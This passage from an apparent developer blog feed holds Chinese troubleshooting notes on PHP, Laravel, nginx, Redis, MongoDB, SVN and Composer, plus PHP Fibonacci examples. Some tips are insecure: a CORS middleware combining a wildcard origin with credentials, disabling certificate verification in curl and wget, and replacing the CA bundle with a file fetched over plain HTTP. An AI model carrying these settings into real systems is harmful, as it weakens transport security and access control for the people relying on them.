的预请求，前端只有收到这个预请求的正常回应，才会发送正式的 POST 请求。新增中间件 app\Http\Middleware\Cors.php，处理 POST 请求 public function handle($request, Closure $next) &#123; $response = $next($request); if ($request-&gt;getMethod() === 'OPTIONS') &#123; $response-&gt;header('Access-Control-Allow-Origin', '*'); $response-&gt;header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS'); $response-&gt;header('Access-Control-Allow-Credentials', 'true'); $response-&gt;header('Access-Control-Allow-Headers', 'Authorization, Content-Type, X-PINGOTHER'); &#125; $response-&gt;header('Access-Control-Allow-Origin', '*'); return $response; &#125; protected $routeMiddleware = [ ... 'cors' =&gt; \App\Http\Middleware\Cors::class, ];Route::post('upload', 'UploadController@upload')-&gt;middleware('cors'); Git status中文乱码问题123456789101112131415161718192021222324https://blog.huzhifeng.com/2016/03/08/Git-Tips-And-Tricks/git config --global core.quotepath falseroot@huzhifeng:~/blog# cat ~/.gitconfig[user] name = huzhifeng email = zhifeng.hu@email.com[core] editor = vim quotepath = false[alias] co = checkout st = status dt = difftool di = diffroot@huzhifeng:~/blog#root@huzhifeng:~/blog# git statusOn branch masterYour branch is up-to-date with 'origin/master'.Untracked files: (use "git add &lt;file&gt;..." to include in what will be committed) source/_posts/WiFi定时开关.mdnothing added to commit but untracked files present (use "git add" to track)root@huzhifeng:~/blog# Cannot run program “svn”12345678910111213141516171819svn1.8使用了命令工具（command line client tools）默认安装SVN时是未安装此客户端的安装的时候选择 command line client tools (will be installed on local)$ ls /d/svn/bin/*.exe/d/svn/bin/ConnectVPN.exe* /d/svn/bin/TortoiseBlame.exe* /d/svn/bin/TortoiseProc.exe*/d/svn/bin/sendrpt.exe* /d/svn/bin/TortoiseIDiff.exe* /d/svn/bin/TortoiseUDiff.exe*/d/svn/bin/SubWCRev.exe* /d/svn/bin/TortoiseMerge.exe* /d/svn/bin/TSVNCache.exe*/d/svn/bin/SubWCRevCOM.exe* /d/svn/bin/TortoisePlink.exe*安装后就有svn 命令 $ ls /d/svn/bin/*.exe/d/svn/bin/ConnectVPN.exe* /d/svn/bin/svndumpfilter.exe* /d/svn/bin/TortoiseBlame.exe*/d/svn/bin/sendrpt.exe* /d/svn/bin/svnlook.exe* /d/svn/bin/TortoiseIDiff.exe*/d/svn/bin/SubWCRev.exe* /d/svn/bin/svnmucc.exe* /d/svn/bin/TortoiseMerge.exe*/d/svn/bin/SubWCRevCOM.exe* /d/svn/bin/svnrdump.exe* /d/svn/bin/TortoisePlink.exe*/d/svn/bin/svn.exe* /d/svn/bin/svnserve.exe* /d/svn/bin/TortoiseProc.exe*/d/svn/bin/svnadmin.exe* /d/svn/bin/svnsync.exe* /d/svn/bin/TortoiseUDiff.exe*/d/svn/bin/svnbench.exe* /d/svn/bin/svnversion.exe* /d/svn/bin/TSVNCache.exe*https://www.jianshu.com/p/9cd383bdbe09 PhpStorm中如何配置SVN svn比较版本 svn try setting http-chunked-requests to auto or no123456789101112131415161718192021https://stackoverflow.com/questions/17399664/subversion-1-8-0-client-working-against-a-1-6-11-server https://www.cnblogs.com/QLeelulu/archive/2009/12/09/1619927.html vi C:\Users\xxx\AppData\Roaming\Subversion\servers[global]# http-proxy-exceptions = *.exception.com, www.internal-site.org# http-proxy-host = defaultproxy.whatever.com# http-proxy-port = 7000# http-proxy-username = defaultusername# http-proxy-password = defaultpassword# http-compression = auto# No http-timeout, so just use the builtin default.# ssl-authority-files = /path/to/CAcert.pem;/path/to/CAcert2.pem## Password / passphrase caching parameters:# store-passwords = no# store-ssl-client-cert-pp = no# store-plaintext-passwords = no# store-ssl-client-cert-pp-plaintext = nohttp-chunked-requests = no先选择ShowLog查看修改记录，然后选择你要比较的两个版本，然后按右键选 Compare revisions 单机对应文件可以看到差异比较后选中文件导出差异文件 ipv6惹的祸1234567891011Operation timed out after 0 milliseconds with 0 out of 0 bytes received Resolving timed out after 5514 millisecondswget www.domain.com--2016-11-19 22:17:30-- http://www.domain.com/Resolving www.domain.com... # 此处停滞约 5 秒xxx.xxx.xxx.xxxConnecting to www.domain.com|xxx.xxx.xxx.xxx|:80... connected.HTTP request sent, awaiting response... 200 OKcurl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 ); php 只接受1000个 请求参数12345678在查看php的error log 发现有句提示如下http://www.54php.cn/default/156.htmlUnknown: Input variables exceeded 1000这句提示就是 最多1000 的请求参数，这个在某些项目中1000可能满足不了需求，所以我们需要修改下，找到php.ini文件 ，搜索关键字 max_input_vars 根据项目需求设置满足你需求的值 502 Bad Gateway错误1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374php程序执行时间过长而超时，检查nginx和fastcgi中各种timeout设置。nginx:fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout300;keepalive_timeout;php-fpm:request_terminate_timeout=300;php.ini:max_execution_time=300;不过request_terminate_timeout参数会直接杀掉php进程，然后重启php进程，这样前端nginx就会返回104: Connection reset by peer，最好设成request_terminate_timeout=0;但最重要的是程序里要设置好超时，不要使用php-fpm的request_terminate_timeout。https://blog.51cto.com/smileyouth/1586237使用 netstat -napo |grep "php-fpm" | wc -l 查看一下当前fastcgi进程个数，如果个数接近conf里配置的上限，就需要调高进程数。http://www.nginx.cn/102.html[root@localhost ~]# grep slow /etc/php-fpm.d/www.conf; - 'slowlog'; The log file for slow requests; Note: slowlog is mandatory if request_slowlog_timeout is setslowlog = /var/log/php7/slow.log; dumped to the 'slowlog' file. A value of '0s' means 'off'.request_slowlog_timeout = 2s[root@localhost ~]# tail -f /var/log/php7/slow.log[0x00007f347c6143a0] xhprof_generate_image_by_dot() /data1/projects/public/xhprof/xhprof_lib/utils/callgraph_utils.php:450[0x00007f347c614270] xhprof_get_content_by_run() /data1/projects/public/xhprof/xhprof_lib/utils/callgraph_utils.php:474[0x00007f347c614170] xhprof_render_image() /data1/projects/public/xhprof/xhprof_html/callgraph.php:85[22-Feb-2019 17:20:07] [pool www] pid 3899script_filename = /data1/projects/public/xhprof/xhprof_html/callgraph.php[0x00007f347c6144c0] stream_get_contents() /data1/projects/public/xhprof/xhprof_lib/utils/callgraph_utils.php:117[0x00007f347c6143a0] xhprof_generate_image_by_dot() /data1/projects/public/xhprof/xhprof_lib/utils/callgraph_utils.php:450[0x00007f347c614270] xhprof_get_content_by_run() /data1/projects/public/xhprof/xhprof_lib/utils/callgraph_utils.php:474[0x00007f347c614170] xhprof_render_image() /data1/projects/public/xhprof/xhprof_html/callgraph.php:85[root@localhost ~]# cat /etc/php-fpm.conf|grep error;error_log = log/php-fpm.logerror_log = /var/log/php-fpm.logtail -f /var/log/php-fpm.log[22-Feb-2019 16:53:21] WARNING: [pool www] child 1649, script '/data1/projects/suping/public/xhprof/xhprof_html/callgraph.php' (request: "GET /public/xhprof/xhprof_html/callgraph.php") executing too slow (2.619120 sec), logging[22-Feb-2019 16:53:21] NOTICE: child 1649 stopped for tracing[22-Feb-2019 16:53:21] NOTICE: about to trace 1649[22-Feb-2019 16:53:21] NOTICE: finished trace of 1649[22-Feb-2019 16:53:29] WARNING: [pool www] child 1649, script '/data1/projects/suping/public/xhprof/xhprof_html/callgraph.php' (request: "GET /public/xhprof/xhprof_html/callgraph.php") execution timed out (10.619676 sec), terminating[22-Feb-2019 16:53:29] WARNING: [pool www] child 1649 exited on signal 15 (SIGTERM) after 234.714340 seconds from start[22-Feb-2019 16:53:29] NOTICE: [pool www] child 2342 started[root@localhost suping]# grep timeout /data0/opt/php7/etc/php-fpm.d/www.conf; pm.process_idle_timeout - The number of seconds after which;pm.process_idle_timeout = 10s;; Note: slowlog is mandatory if request_slowlog_timeout is set; The timeout for serving a single request after which a PHP backtrace will berequest_slowlog_timeout = 2s; The timeout for serving a single request after which the worker process willrequest_terminate_timeout = 10内存过高，php脚本执行超时这两种情况都返回的是500.500和502的区别是，500是php脚本自身错误（内存超出配置memory_limit；超过cpu执行时间set_time_limit(),语法错误等）502是php-fpm进程本身挂掉（php-fpm未启动；request_terminate_timeout超时）php-fpm进程和php脚本是两回事，因此状态码上也会有区别。php-cgi进程数不够用、php执行时间长、或者是php-cgi进程死掉，都会出现502错误。慢查询2s，超时10s，改为15 字符集转转换失败12345$xml = iconv('UTF-8', 'GBK', $xml);就是这一步，iconv转换失败的时候会返回false而不是报错，也没有日志记录，所以 $xml 被置为 false 了。。。。。至于为什么会失败，我也不知道，应该是有某种特殊编码把，有一个办法可以跳过这个转换失败,就是在目标字符集加一个选项：$xml = iconv('UTF-8', 'GBK//IGNORE', $xml);http://blog.wuxu92.com/php-iconv-ignore-option/ PHP7 MongoDB12345678$mongo = new MongoDB\Driver\Manager();$cursor = $mongo-&gt;executeQuery('db.collection', new MongoDB\Driver\Query($arr, $opts), new MongoDB\Driver\ReadPreference(MongoDB\Driver\ReadPreference::RP_PRIMARY_PREFERRED));//注意，这里的 $arr和 $opts; https://my.oschina.net/jsk/blog/644287$arr = ['_id'=&gt; ['$in'=&gt; $ids] ]; // 根据id数组获取集合$opts = ['limit'=&gt; $limit, 'skip'=&gt; $skip ]; // 不推荐// 这里在传递$limit和$skip的时候，最好先转成整数，不然不生效：$opts = ['limit'=&gt; (int) $limit, 'skip'=&gt; (int) $skip ]; // 推荐写法。// 写到这里，让人怀疑是不是在用php了，怎么还需要这样的类型转换。字符串整数都不行！ MISCONF Redis is configured to save RDB snapshots123456789101112131415161718192021 Redis 被配置为保存 RDB 快照，但是现在无法写入磁盘，那么这无非是两个问题，一个是没有权限，一个是空间不足，于是立即登录到 Redis 所在服务器，分别查看了权限和空间都没有问题，当务之急是先修复问题，然后再定位原因，所以立即在服务启动 redis-cli，将 stop-writes-on-bgsave-error 设置为 on（该选项在 Redis 配置文件中默认配置为 yes，表示 Redis 报错时停止写入并报错，我们将其设置为 on 表示忽略报错，继续执行）：https://laravelacademy.org/post/9666.html#redis-cli 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no打开 Redis Server 的日志文件 /var/log/redis/redis-server.log，想从这里寻找蛛丝马迹，果不其然，发现了大量报错日志：14632:C 09 Nov 08:58:14.020 # Failed opening .rdb for saving: Read-only file system30211:M 09 Nov 08:58:14.120 # Background saving error把 Redis 配置文件中 bind 选项配置为了 0.0.0.0，以便让多个机器可以访问，但是没有配置任何权限和 iptables 过滤规则，这样导致的结果是外网可以自由访问我的 Redis 服务器，这种故障会导致 Redis 被 block配置允许 192.168.0.1 和 192.168.0.2 这两个 IP 访问 6379 端口（具体 IP 以你自己服务器的公网 IP 为准，允许自身访问 IP 可以配置为 127.0.0.1）：# 禁止任何 IP 访问 6379 端口iptables -I INPUT -p TCP --dport 6379 -j REJECT# 允许指定 IP 访问 6379 端口iptables -I INPUT -s 192.168.0.1 -p tcp --dport 6379 -j ACCEPTiptables -I INPUT -s 192.168.0.2 -p tcp --dport 6379 -j ACCEPT# 保存并生效iptables-save然后我们需要通过 kill -9 杀死 redis-server 进程，并通过 redis-server /etc/redis/redis.conf 重新启动 如果你是将 Redis 服务器安装在应用所在服务器，并且只有这么一台机器，不用这么大费周章的配置，只需在 Redis 配置文件中将 bind 选项设置为 127.0.0.1 只允许本机访问即可。 mongodb3.6 The ‘cursor’ option is required, except for aggregate with the explain argument123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141//Mongo-记一次安装启动异常 http://zhangyuyu.github.io/2017/12/27/Mongo-%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E8%A3%85%E5%90%AF%E5%8A%A8%E9%94%99%E8%AF%AF///https://github.com/jenssegers/laravel-mongodb/pull/1570/commits/6076df9cee559ff6e75956b7a0f9ccf7c35f76b5#diff-c19a83820d10bafa13d449ec36d0b360//https://github.com/jenssegers/laravel-mongodb/pull/1569/commits/36222977ca52635b7d06377f9553fe67b903fede#diff-d013b1af075671441bada29dbedab6ff/vendor/jenssegers/mongodb/src/Jenssegers/Mongodb/Collection.php:47public function __call($method, $parameters) &#123; $start = microtime(true); //增加判断 if($method == 'aggregate') &#123; $parameters[] = ['cursor' =&gt;(object) []]; &#125; $result = call_user_func_array([$this-&gt;collection, $method], $parameters); if($method == 'aggregate') &#123; $result['result'] = $result['cursor']['firstBatch']; &#125; if ($this-&gt;connection-&gt;logging()) &#123; // Once we have run the query we will calculate the time that it took to run and // then log the query, bindings, and execution time so we will report them on // the event that the developer needs them. We'll log time in milliseconds. $time = $this-&gt;connection-&gt;getElapsedTime($start); $query = []; // Convert the query paramters to a json string. foreach ($parameters as $parameter) &#123; try &#123; $query[] = json_encode($parameter); &#125; catch (Exception $e) &#123; $query[] = '&#123;...&#125;'; &#125; &#125; $queryString = $this-&gt;collection-&gt;getName() . '.' . $method . '(' . implode(',', $query) . ')'; $this-&gt;connection-&gt;logQuery($queryString, [], $time); &#125; return $result; &#125;// /vendor/jenssegers/mongodb/src/Jenssegers/Mongodb/Query/Builder.php:228public function getFresh($columns = []) &#123; // If no columns have been specified for the select statement, we will set them // here to either the passed columns, or the standard default of retrieving // all of the columns on the table using the "wildcard" column character. if (is_null($this-&gt;columns)) $this-&gt;columns = $columns; // Drop all columns if * is present, MongoDB does not work this way. if (in_array('*', $this-&gt;columns)) $this-&gt;columns = []; // Compile wheres $wheres = $this-&gt;compileWheres(); // Use MongoDB's aggregation framework when using grouping or aggregation functions. if ($this-&gt;groups or $this-&gt;aggregate or $this-&gt;paginating) &#123; $group = []; // Add grouping columns to the $group part of the aggregation pipeline. if ($this-&gt;groups) &#123; foreach ($this-&gt;groups as $column) &#123; $group['_id'][$column] = '$' . $column; // When grouping, also add the $last operator to each grouped field, // this mimics MySQL's behaviour a bit. $group[$column] = ['$last' =&gt; '$' . $column]; &#125; // Do the same for other columns that are selected. foreach ($this-&gt;columns as $column) &#123; $key = str_replace('.', '_', $column); $group[$key] = ['$last' =&gt; '$' . $column]; &#125; &#125; // Add aggregation functions to the $group part of the aggregation pipeline, // these may override previous aggregations. if ($this-&gt;aggregate) &#123; $function = $this-&gt;aggregate['function']; foreach ($this-&gt;aggregate['columns'] as $column) &#123; // Translate count into sum. if ($function == 'count') &#123; $group['aggregate'] = ['$sum' =&gt; 1]; &#125; // Pass other functions directly. else &#123; $group['aggregate'] = ['$' . $function =&gt; '$' . $column]; &#125; &#125; &#125; // When using pagination, we limit the number of returned columns // by adding a projection. if ($this-&gt;paginating) &#123; foreach ($this-&gt;columns as $column) &#123; $this-&gt;projections[$column] = 1; &#125; &#125; // The _id field is mandatory when using grouping. if ($group and empty($group['_id'])) &#123; $group['_id'] = null; &#125; // Build the aggregation pipeline. $pipeline = []; if ($wheres) $pipeline[] = ['$match' =&gt; $wheres]; if ($group) $pipeline[] = ['$group' =&gt; $group]; // Apply order and limit if ($this-&gt;orders) $pipeline[] = ['$sort' =&gt; $this-&gt;orders]; if ($this-&gt;offset) $pipeline[] = ['$skip' =&gt; $this-&gt;offset]; if ($this-&gt;limit) $pipeline[] = ['$limit' =&gt; $this-&gt;limit]; if ($this-&gt;projections) $pipeline[] = ['$project' =&gt; $this-&gt;projections]; // Execute aggregation $results = $this-&gt;collection-&gt;aggregate($pipeline); // Return results 更改返回值 return $results['cursor']['firstBatch']; &#125; php发送email 多了!12345678910111213141516171819202122232425262728293031323334353637383940https://blog.csdn.net/yylad/article/details/9048871造成这种现象的两种可能和解决办法: html表情和CSS与邮件客户端不兼容, 以outlook为例, 参考http://msdn.microsoft.com/zh-cn/library/aa338201(v=office.12).aspx, 这个问题没其他办法, 只能自己优化代码, 采用标准化写法, 如标签尽量完整, 浏览器可以识别&lt;br&gt;表情, 但要换成标准写法&lt;br/&gt;, 还有就是记得闭合标签.邮件内容过长, 导致解析出问题.通常邮件信息每行不得超过998个字符, 而整个html邮件体中没有换行符, 会自动的被认为是一行, 所以就会有问题 (998 听起来有点像电视购物呢 - -!!). 怎么办呢?两种解决办法:1. 人工增加换行符: 以上面代码为例, 将$body取值替换为 $body = wordwrap(get_email_body($an_array),900, "\n");即, 在邮件体字符串中,每900个字符加一个换行符, 这样就保证了每行字符串不会超过上限. 但同时也会带来新的问题, 因为额外加的字符串在某些情况下, 可能会导致邮件布局有问题(特定浏览器, 操作系统或者邮件客户端).2. 用base64编码 $header = "MIME-Version: 1.0\r\nContent-Transfer-Encoding: base64\r\nContent-type: text/html; charset=utf-8\r\nFrom: test&lt;test@test.com&gt;";$body = rtrim(chunk_split(base64_encode(get_email_body($an_array))));首先给body添加base64编码, 然后在header中添加Content-Transfer-Encoding: base64说明. 因为base64编码会自动每76个字符添加一个换行符, 所以自然满足了每998字符换行的问题.--------------------- If you are seeing unwanted line breaks preceded by exclamation marks ("!") in the emails you send with mail(), you may be having the same problem I had: exceeding the maximum line length (998 chars) specified in RFC 2822 (http://www.faqs.org/rfcs/rfc2822.html).You can get around this restriction by using base64 encoding: add a "Content-Transfer-Encoding: base64" header and encode the contents with$base64contents = rtrim(chunk_split(base64_encode($contents))); $headers = "From:someone@somewhere.com\r\n"; $headers .= "MIME-Version: 1.0\r\n"; $headers .= "Content-Type: text/html; charset=utf-8\r\n"; $headers .= "Content-Transfer-Encoding:base64 \r\n"; $message = "THIS IS A TEST"; $messagebody= $base64contents = rtrim(chunk_split(base64_encode($message))); mail(tofoo@bar.com, $subject, $messagebody, $headers ) @mail($to, $subject, $msg, "From: $from\nContent-Type: text/html; charset=iso-8859-1; Content-Transfer-Encoding: base64"); PhpSpreadsheet 输出 Excel 时自动在 xls 后面加入 html12345678//http://www.sunbelife.com/p/b63c.htmlheader('Content-Type: application/vnd.ms-excel');header('Content-Disposition: attachment;filename="赴宴信息.xls"');header('Cache-Control: max-age=0');$writer = \PhpOffice\PhpSpreadsheet\IOFactory::createWriter($spreadsheet, 'Xls');$writer-&gt;save('php://output');exit; Composer 使用镜像出现权限问题123456789vagrant@homestead:~/Code/larabbs$ composer require "overtrue/laravel-lang:~3.0"./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev)file_put_contents(/home/vagrant/.composer/cache/repo/https---packagist.laravel-china.org/provider-illuminate$console.json): failed to open stream: Permission deniedhttps://packagist.laravel-china.org could not be fully loaded, package information was loaded from the local cache and may be out of datesudo chown -R $USER ~/.composer/ https://learnku.com/laravel/t/29560 No query results for model123456789101112131415如果将Route::get('/users/&#123;user&#125;', 'UserController@show')-&gt;name('users.show');放在了Route::get('/users/info', 'UserController@info')-&gt;name('users.info');前面的话，请求 /users/info 会提示No query results for model [App\Post].原来测试的时候没有想过路由冲突的问题。通过更换路由先后顺序确实是可以解决这个情况。但是需要这样解决，太无法体现 laravel 的优雅了。我们可以用上路由提供的正则表达式来很好解决这个问题。//用户信息Route::get('/users/&#123;user&#125;', 'UserController@show')-&gt;where('user', '[0-9]+')-&gt;name('users.show');https://learnku.com/articles/25947#replies composer Out of memory1234567891011121314151617181920212223242526272829303132333435363738394041$ composer require chenhua/laravel5-markdown-editor 1/2: https://packagist.laravel-china.org/p/provider-latest$5f7ff05acde3b89b16151c86e800d5ac9afebd3a1b827d539c5f341b3355db2f.json 2/2: https://packagist.laravel-china.org/p/provider-2019-04$ceaf82cd34c625192605362e4eb8f1477899cb63e2a0b3cb527e65d124b42a24.json Finished: success: 2, skipped: 0, failure: 0, total: 2Using version ^1.0 for chenhua/laravel5-markdown-editor./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev)VirtualAlloc() failed: [0x00000008] ▒洢▒ռ䲻▒㣬▒޷▒▒▒▒▒▒▒▒▒VirtualFree() failed: [0x000001e7] ▒▒ͼ▒▒▒▒▒▒Ч▒ĵ▒ַ▒▒VirtualAlloc() failed: [0x00000008] ▒洢▒ռ䲻▒㣬▒޷▒▒▒▒▒▒▒▒▒VirtualFree() failed: [0x000001e7] ▒▒ͼ▒▒▒▒▒▒Ч▒ĵ▒ַ▒▒PHP Fatal error: Out of memory (allocated 962592768) (tried to allocate 4096 bytes) in phar://D:/php_study/PHPTutorial/php/php-7.1.13-nts/composer/src/Composer/DependencyResolver/RuleWatchGraph.php on line 52Fatal error: Out of memory (allocated 962592768) (tried to allocate 4096 bytes) in phar://D:/php_study/PHPTutorial/php/php-7.1.13-nts/composer/src/Composer/DependencyResolver/RuleWatchGraph.php on line 52 php -d memory_limit=-1 `which composer` update/install -vvv， 去掉内存限制php -d memory_limit=1G composer require chenhua/laravel5-markdown-editorsudo vim /etc/php5/cli/php.ini 按: 进入命令行模式 输入 /memory_limit，找到 memory_limit 修改配置为 memory_limit = 1024Mfree -m total used free shared buff/cache availableMem: 864 372 306 50 185 296Swap: 0 0 0# 如上发现Swap实际都为0/bin/dd if=/dev/zero of=/var/swap.1 bs=1M count=1024/sbin/mkswap /var/swap.1/sbin/swapon /var/swap.1# 再次使用free -m，发现已经有了Swap内存配置 total used free shared buff/cache availableMem: 864 383 67 49 413 267Swap: 1023 0 1023# 再次运行composer install即可 mysql 慢查询 502123456789101112131415161718192021222324252627282930大量请求响应为502，但每次故障发生时，错误响应一般集中在一台Web服务器MySQL数据库服务器CPU使用率飙升故障刚开始出现时，重启/关闭出现故障现象的MySQL服务，或将出现故障的Web服务器上所有PHP-FPM重启，也能解一时的问题，但治不了本，故障还是频繁出现。在故障发生时，从相关服务器上收集到的信息如下所示：1.出现故障现象的Web服务器 - CPU使用率、内存使用率等系统指标均正常，但PHP-FPM子进程数达到上限（12 x 10 = 120），并且PHP-FPM进程与数据库代理服务器之间的网络连接数量较多（与PHP-FPM子进程数大致相当）2.出现故障现象的MySQL服务器 - CPU使用率飙升，主要为MySQL进程占用；MySQL进程与数据库代理服务器之间的网络连接较多3.继而，对出现故障现象的MySQL服务器上的数据库执行命令SHOW PROCESSLIST（查看当前MySQL实例运行着哪些线程）Query：表明当前线程正在执行一次SQL查询操作。该SQL为SELECT h.host, p.result, p.update_time FROM PIXIU p join Host h using(host_id) WHERE ...，线程所处状态为“Sorting result”（正在创建排序索引），持续时间为86-99秒左右。很明显，这句SQL语句花费的时间过长，存在问题。综合上面所述，可以引出一个猜测：由于这条SQL查询需耗费较长时间，并且被频繁执行，涉及该SQL的请求需要较长时间完成，大量SQL线程排队无响应，阻塞了大量PHP-FPM进程，在某些时候会达到PHP-FPM并发子进程数上限（更何况某个会被频繁访问的页面请求涉及该SQL，导致情况更糟），PHP-FPM无法处理新的请求，对于已有的请求也会因为超时导致Nginx响应502。那么针对该猜测，可以做两个优化来解决故障：优化这条SQL使用缓存这条SQL的完整语句为： SELECT h.host,p.result,p.update_time FROM Pixiu p join Host h using(host_id) WHERE result!='[]' order by update_time desc ，其中字段p.result的类型为 mediumtext NOT NULL ，字段p.update_time的类型为 timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP 。由于业务逻辑并不要求该SQL的结果是排序的，所以我们将该SQL中的排序条件order by update_time desc删除，经测试发现查询时间大幅度降低到9ms左右（原来的平均查询时间为600多-700ms左右），另外，由于业务逻辑对于该条SQL涉及的数据的实时性要求不高，我们使用Memcached缓存了该SQL的查询结果。http://blog.xiayf.cn/2015/10/02/note-of-a-system-fault/数据库管理后台默认是只读：读数据表列表、数据表结构、单个表的若干条数据我们应用在实现上有这样的逻辑：登录用户的每次访问需要登录权限的页面都会自动更新用户的最新的访问时间，即Users数据表的updated_time字段，也即会写Users数据表。由于磁盘已满，所以写会失败，故障信息提示“数据库中找不到Users数据表”，估计和MySQL的写实现有关。之后清理了磁盘，故障立即恢复。 api频率限制1234567891011121314151617181920// 每个IP一分钟10次$limit = 10;$cache = new Memcached();$cache-&gt;addServer('127.0.0.1', 11211);$key = __FUNCTION__.$_SERVER['REMOTE_ADDR'];$requestNum = $cache-&gt;get($key);if ($requestNum !== FALSE &amp;&amp; $requestNum &gt; 10) &#123; echo json_encode(array( 'code' =&gt; 403, 'message' =&gt; '请求太频繁，请一分钟后再试', )); return;&#125;$cache-&gt;add($key, 0, time()+60);$cache-&gt;increment($key, 1);http://blog.xiayf.cn/2016/06/05/frequency-limitation/ curl请求https1234567891011121314151617181920212223242526272829303132333435363738394041$ curl 'https://x.x.x.x/get_ips'curl: (60) SSL certificate problem, verify that the CA cert is OK. Details:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failedMore details here: http://curl.haxx.se/docs/sslcerts.html发现可能是https证书的问题。于是添加--verbose参数，再次使用curl进行请求，以获取更多交互信息。截取部分输出如下$ curl 'https://x.x.x.x/get_ips' --verbose* About to connect() to x.x.x.x port 80* Trying x.x.x.x... connected* Connected to x.x.x.x (x.x.x.x) port 80* successfully set certificate verify locations:* CAfile: /etc/pki/tls/certs/ca-bundle.crtCApath: none* SSLv2, Client hello (1):SSLv3, TLS handshake, Server hello (2):SSLv3, TLS handshake, CERT (11):SSLv3, TLS alert, Server hello (2):SSL certificate problem, verify that the CA cert is OK. Details:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed* Closing connection #0curl: (60) SSL certificate problem, verify that the CA cert is OK. Details:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failedMore details here: http://curl.haxx.se/docs/sslcerts.html可见使用的证书的是/etc/pki/tls/certs/ca-bundle.crt。使用测试机上的证书替换线上服务器的证书后，问题解决。如果没有可用的证书，可以使用如下方法：$ curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt请求https的资源时，遇到证书不匹配的问题，一般的工具都有不进行https证书验证的选项，比如：$ wget 'https://x.x.x.x/get_ips' --no-check-certificate$ curl 'https://x.x.x.x/get_ips' -k当然，也可以在请求时指定证书，或者对使用的https ca证书进行更新http://blog.gaoyuan.xyz/2014/05/14/a-trouble-in-request-https-in-curl/ pip error: command ‘gcc’ failed with exit status123456789101112Command /usr/bin/python -c "import setuptools;__file__='/tmp/pip-build-root/lxml/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))" install --record /tmp/pip-PjviBq-record/install-record.txt --single-version-externally-managed failed with error code 1 in /tmp/pip-build-root/lxmlStoring complete log in /root/.pip/pip.logFor python 2.7$ sudo yum -y install gcc gcc-c++ kernel-devel$ sudo yum -y install python-devel libxslt-devel libffi-devel openssl-devel$ pip install "your python packet"For python 3.4$ sudo apt-get install python3-dev$ pip install rdbtools python-lzfhttps://learnku.com/articles/33211 Nginx 中 502 和 504 错误详解 面试题 把SESSION存储在数据库中 PHP超时的坑 Nginx常见的错误及解决方法 Laravel Redis 多个进程同时取队列问题详解 使用 Laravel Queue 不得不明白的知识 Lua在Redis的应用 Redis 实战之薄荷 timeline 的优化 Laravel5.2队列驱动expire参数设置带来的重复执行问题 数据库驱动 为什么 Laravel 会重复执行同一个队列任务？ Laravel queue 重复执行脚本的问题 Laravel队列使用中踩的坑,不报错但是队列一直再重试]]></content>
      <tags>
        <tag>问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[斐波那契数列]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%2F</url>
    <content type="text"><![CDATA[本来来自laravel-chinar 普通递归实现1234567891011121314function fibonacci_recursive($n) &#123; if ($n &lt;= 1) &#123; return 1; &#125; return fibonacci_recursive($n - 1) + fibonacci_recursive($n - 2);&#125;for ($i = 1; $i &lt;= 30; $i++) &#123; echo fibonacci_recursive($i) . " ";&#125;耗时3.52s user 0.00s system 99% cpu 3.521 total 递归优化123456789101112131415161718192021222324function fibonacci_recursive_optimization($n) &#123; static $caches_arr = []; if (isset($caches_arr[$n])) &#123; return $caches_arr[$n]; &#125; if ($n &lt;= 1) &#123; $res = 1; &#125; else &#123; $res = fibonacci_recursive_optimization($n - 1) + fibonacci_recursive_optimization($n - 2); &#125; $caches_arr[$n] = $res; return $res;&#125;for ($i = 1; $i &lt;= 30; $i++) &#123; echo fibonacci_recursive_optimization($i) . " ";&#125;耗时0.01s user 0.01s system 98% cpu 0.022 total 闭包实现12345678910111213141516function fibonacci_closure() &#123; static $x = 0; static $y = 1; return function () use (&amp;$x, &amp;$y) &#123; [$x, $y] = [$y, $x + $y]; return $y; &#125;;&#125;$f = fibonacci_closure();for ($i = 1; $i &lt;= 30; $i++) &#123; echo $f() . " ";&#125;耗时0.02s user 0.01s system 99% cpu 0.030 total while循环123456789function getNum($n) &#123; $num = 0; $pre = 1; while ($n--) &#123; $num += $pre; $pre = $num - $pre; &#125; return $num;&#125; 上台阶问题12345678910111213141516有个人想上一个 50 级的台阶，每次只能迈 1 级或者迈 2 级台阶，问：这个人有多少种方法可以把台阶走完？例如：总共 3 级台阶，可以先迈 1 级再迈 2 级，或者先迈 2 级再迈 1 级，或者迈 3 次 1 级总共 3 中方式。当我们走到第 50 层的时候，最后有两种选择，从 49 开始迈 1 级或者从 48 开始迈 2 级。那么到达 50 层的走法等于到达 49 层的走法 + 到达 48 层的走法，以此类推，可以得到总的走法符合斐波那契数列，我们的代码就好写了function digui($int)&#123; if ($int == 1) &#123; return $int; &#125; if ($int == 2) &#123; return $int; &#125; return digui($int - 1) + digui($int - 2);&#125;dump(digui(50));https://learnku.com/articles/29920 算法网精品文]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go命令行工具]]></title>
    <url>%2F2018%2F11%2F30%2Fgo%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%2F</url>
